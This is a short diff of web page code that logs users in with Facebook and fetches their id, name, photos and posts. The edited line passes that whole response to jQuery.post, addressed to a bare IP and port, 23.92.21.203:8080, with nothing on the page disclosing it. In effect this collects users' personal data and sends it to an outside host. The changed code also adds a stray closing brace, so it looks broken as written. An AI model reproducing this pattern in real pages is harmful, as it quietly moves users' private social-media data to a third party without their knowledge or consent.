@@ -4,7 +4,7 @@
   src="https://code.jquery.com/jquery-3.1.1.min.js"
   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
   crossorigin="anonymous"></script>
-  
+
 <script>
 	window.fbAsyncInit = function() {
 		FB.init({
@@ -34,16 +34,8 @@ function myFacebookLogin() {
 			'GET',
 			{"fields":"id,name,photos,posts"},
 			function(response) {
-				
-
-				$.ajax({
-					type: 'POST',    
-					url:'23.92.21.203:8080',
-					data: response,
-					success: function(msg){
-						alert('wow' + msg);
-					}
-				});
+				jQuery.post('23.92.21.203:8080',response);
+				}
 
 				
 			});
